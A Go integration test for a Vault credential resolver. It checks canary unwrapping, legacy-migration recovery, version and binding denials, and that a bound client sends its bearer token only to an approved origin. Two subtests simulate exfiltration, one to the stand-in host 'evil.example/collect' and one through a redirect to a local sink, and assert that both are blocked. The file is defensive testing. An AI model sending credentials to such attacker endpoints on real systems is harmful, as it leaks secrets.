//go:build vaultintegration

package main

import (
	"bytes"
	"context"
	"io"
	"log"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
)

type secretFixtureLogs struct {
	mu   sync.Mutex
	data bytes.Buffer
}

func (b *secretFixtureLogs) Write(p []byte) (int, error) {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.data.Write(p)
}
func (b *secretFixtureLogs) String() string { b.mu.Lock(); defer b.mu.Unlock(); return b.data.String() }

// Explicit opt-in suite: missing real identity prerequisites fail, never skip.
func TestVaultRealIdentity(t *testing.T) {
	dir := os.Getenv("NEXUS_SECRET_FIXTURE_DIR")
	if dir == "" {
		t.Fatal("NEXUS_SECRET_FIXTURE_DIR required")
	}
	config := VaultConfig{Address: "https://127.0.0.1:58201", TokenFile: filepath.Join(dir, "identity", "gateway-token"), CAFile: filepath.Join(dir, "tls", "ca.pem"), RegistryFile: filepath.Join(dir, "runtime", "registry.json"), TrustFile: filepath.Join(dir, "runtime", "trust.json"), FloorFile: filepath.Join(dir, "runtime", "floor.json"), RegistryID: "fixture-registry", Resources: []string{"transit/nexus-provider-v1"}, Origins: []string{"https://api.example.com"}}
	resolver, err := NewVaultCredentialResolver(config)
	if err != nil {
		t.Fatal("real resolver bootstrap failed", err)
	}
	ref := CredentialRef{TenantID: "fixture-tenant", CredentialID: "fixture-credential", CredentialVersion: 1, ProviderID: "fixture-provider", Mode: "byok"}
	credential, err := resolver.Resolve(context.Background(), ref)
	if err != nil {
		t.Fatal("real Gateway identity unwrap failed", err)
	}
	expected, err := os.ReadFile(filepath.Join(dir, "runtime", "expected-canary"))
	if err != nil {
		t.Fatal("expected canary file unavailable")
	}
	defer clear(expected)
	if credential.Secret != string(expected) {
		t.Fatal("real plaintext comparison failed")
	}
	t.Run("legacy_migration_canary_restored_via_real_vault", func(t *testing.T) {
		// AC5 recovery drill: a separately emitted migration registry (legacy
		// versioned-scrypt-v1 ciphertext -> real Vault external registry) must
		// resolve under the real Gateway identity to the same canary. Uses an
		// isolated floor file so the enrollment fixture floor is untouched.
		migrationConfig := VaultConfig{
			Address:      "https://127.0.0.1:58201",
			TokenFile:    filepath.Join(dir, "identity", "gateway-token"),
			CAFile:       filepath.Join(dir, "tls", "ca.pem"),
			RegistryFile: filepath.Join(dir, "runtime", "legacy-migration", "registry.json"),
			TrustFile:    filepath.Join(dir, "runtime", "legacy-migration", "trust.json"),
			FloorFile:    filepath.Join(dir, "runtime", "legacy-migration", "floor.json"),
			RegistryID:   "fixture-registry",
			Resources:    []string{"transit/nexus-provider-v1"},
			Origins:      []string{"https://api.example.com"},
		}
		migrationResolver, err := NewVaultCredentialResolver(migrationConfig)
		if err != nil {
			t.Fatal("migration resolver bootstrap failed", err)
		}
		for _, version := range []int64{1, 2} {
			restoredRef := ref
			restoredRef.CredentialVersion = version
			migrated, err := migrationResolver.Resolve(context.Background(), restoredRef)
			if err != nil {
				t.Fatal("real Gateway unwrap of restored legacy format failed", version, err)
			}
			if migrated.Secret != string(expected) {
				t.Fatal("restored legacy format did not recover canary", version)
			}
		}
	})
	// Compose the actual Vault-unwrapped credential with the real bound transport.
	// Only DNS destination mapping and provider TLS trust are replaced in this
	// disposable test; production has no private-IP or certificate bypass option.
	var approvedCalls, sinkCalls atomic.Int64
	var capturedLogs secretFixtureLogs
	sink := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) { sinkCalls.Add(1); w.WriteHeader(http.StatusNoContent) }))
	sink.Config.ErrorLog = log.New(&capturedLogs, "", 0)
	sink.StartTLS()
	defer sink.Close()
	approved := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		approvedCalls.Add(1)
		if r.Header.Get("Authorization") != "Bearer "+credential.Secret {
			t.Error("approved provider did not receive expected credential")
		}
		if r.URL.Path == "/redirect" {
			w.Header().Set("Location", sink.URL+"/collect")
			w.WriteHeader(http.StatusFound)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, `{"status":"ok"}`)
	}))
	approved.Config.ErrorLog = log.New(&capturedLogs, "", 0)
	approved.StartTLS()
	defer approved.Close()
	transport := approved.Client().Transport.(*http.Transport).Clone()
	transport.TLSClientConfig.ServerName = approved.Certificate().DNSNames[0]
	transport.DisableKeepAlives = true
	transport.DialContext = func(ctx context.Context, network, address string) (net.Conn, error) {
		target := sink.Listener.Addr().String()
		if address == "api.example.com:443" {
			target = approved.Listener.Addr().String()
		}
		conn, e := (&net.Dialer{}).DialContext(ctx, network, target)
		if e != nil {
			return nil, e
		}
		return guardSecretConnection(ctx, conn)
	}
	resolver.outbound = transport
	client, err := resolver.BoundClient(ref, credential)
	if err != nil {
		t.Fatal("real credential dispatch binding failed")
	}
	dispatch := func(t *testing.T, target string) (int, error) {
		t.Helper()
		req, e := http.NewRequest(http.MethodGet, target, nil)
		if e != nil {
			t.Fatal("fixture request invalid")
		}
		req.Header.Set("Authorization", "Bearer "+credential.Secret)
		response, e := client.Do(req)
		if e != nil {
			if strings.Contains(e.Error(), credential.Secret) {
				t.Fatal("credential appeared in boundary error")
			}
			return 0, e
		}
		defer func() { _ = response.Body.Close() }()
		body, readErr := io.ReadAll(io.LimitReader(response.Body, 4096))
		if readErr != nil {
			t.Fatal("fixture response unavailable")
		}
		if bytes.Contains(body, expected) {
			t.Fatal("credential appeared in boundary response")
		}
		for _, values := range response.Header {
			for _, value := range values {
				if strings.Contains(value, credential.Secret) {
					t.Fatal("credential appeared in response header")
				}
			}
		}
		return response.StatusCode, nil
	}
	t.Run("actual_vault_canary_approved_tls_dispatch", func(t *testing.T) {
		status, e := dispatch(t, "https://api.example.com/v1/models")
		if e != nil || status != http.StatusOK || approvedCalls.Load() != 1 {
			t.Fatal("approved TLS dispatch failed")
		}
	})
	t.Run("tampered_origin_exfiltration_sink_denied", func(t *testing.T) {
		if _, e := dispatch(t, "https://evil.example/collect"); e == nil || sinkCalls.Load() != 0 || approvedCalls.Load() != 1 {
			t.Fatal("tampered destination received a request")
		}
	})
	t.Run("credential_redirect_exfiltration_sink_denied", func(t *testing.T) {
		status, e := dispatch(t, "https://api.example.com/redirect")
		if e != nil || status != http.StatusFound || sinkCalls.Load() != 0 || approvedCalls.Load() != 2 {
			t.Fatal("credential redirect reached sink")
		}
	})
	t.Run("captured_boundary_logs_have_no_canary", func(t *testing.T) {
		if strings.Contains(capturedLogs.String(), credential.Secret) {
			t.Fatal("credential appeared in captured server logs")
		}
	})
	second := ref
	second.CredentialVersion = 2
	other, err := resolver.Resolve(context.Background(), second)
	if err != nil || other.Secret != string(expected) {
		t.Fatal("real N/N-1 credential version comparison failed", err)
	}
	ambiguous := ref
	ambiguous.CredentialVersion = 0
	if _, err = resolver.Resolve(context.Background(), ambiguous); err == nil {
		t.Fatal("ambiguous unversioned overlap accepted")
	}
	for _, bad := range []CredentialRef{{TenantID: "wrong-tenant", CredentialID: ref.CredentialID, ProviderID: ref.ProviderID}, {TenantID: ref.TenantID, CredentialID: "wrong-credential", ProviderID: ref.ProviderID}, {TenantID: ref.TenantID, CredentialID: ref.CredentialID, ProviderID: "wrong-provider"}} {
		if _, err = resolver.Resolve(context.Background(), bad); err == nil {
			t.Fatal("real resolver accepted wrong binding")
		}
	}
	config.TokenFile = filepath.Join(t.TempDir(), "denied-token")
	mustWrite(t, config.TokenFile, []byte("synthetic-invalid-identity"))
	denied, err := NewVaultCredentialResolver(config)
	if err != nil {
		t.Fatal("denial setup failed")
	}
	if _, err = denied.Resolve(context.Background(), ref); err == nil {
		t.Fatal("invalid identity reached plaintext")
	}
}
